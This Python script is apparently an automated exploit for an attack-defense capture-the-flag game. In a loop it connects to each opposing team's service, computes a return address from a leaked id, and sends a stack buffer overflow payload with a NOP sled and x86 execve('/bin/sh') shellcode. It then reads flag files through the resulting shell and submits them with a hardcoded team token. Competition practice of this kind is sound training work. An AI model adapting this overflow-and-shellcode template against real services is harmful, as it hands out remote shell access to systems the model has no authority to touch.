#!/usr/bin/env python

import swpag_client
import pwn
import re
import time

def main():
  team = swpag_client.Team("http://52.37.204.0", "nt4yw7LjoPFc2WE49cLG")

  while True:
    targets = team.get_targets(4)

    for target in targets:
      flag_id = target["flag_id"]
      hostname = target["hostname"]
      port = int(target["port"])

      # flag_id = '2658873307'
      # hostname = 'localhost'
      # port = 10004

      print("Running exploit on {0}:{1} -> {2}".format(hostname, port, flag_id))

      flag_obtained = None
        
      offset = 48
      try:
        process = pwn.remote(hostname, port, timeout=3)
        process.readuntil('id ')
        process.readuntil(')')
        process.readuntil('?')
        process.write('W\n')
        process.readuntil('whitespace!\n')
        process.write('8675309 a a\n')
        process.close()

        process = pwn.remote(hostname, port, timeout=3)
        process.readuntil('id ')
        execution_id = process.readuntil(')')
        execution_id = int(execution_id[0:10]) 
        execution_id = execution_id - offset
        big_endian = pwn.p32(execution_id)
        process.write('R\n') 
        process.readuntil('password\n') 
        process.write('\n')
        process.write(b'8675309 ' + b'A'*80 + big_endian + b'\x90'*40 + 
          b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50'
          b'\x89\xe2\x53\x89\xe1\xb0\x4b\x2c\x40\xcd\x80') 


        process.write('\n') 
        # process.send('\n') 
        # process.wait(0.5)
        # print(process.readuntil('password!'))
        # process.send('\n')
        # process.send('\n')
        print('cat ' + flag_id)
        process.wait(0.5) 
        process.write("cat " + flag_id + "\n")
        process.wait(0.5)
        flags = process.recvall(timeout=2)
      
        if type(flags) == bytes:
          flags = flags.decode('ascii')
        flags = re.findall(r'FLG[A-Za-z0-9]{13}', flags)
        if len(flags) > 0:
          results = team.submit_flag(flags)
          print(results)
        process.close()

      except Exception as e:
        print('error: ', e)
        process.close()
    time.sleep(60)
    

if __name__ == "__main__":
  main()
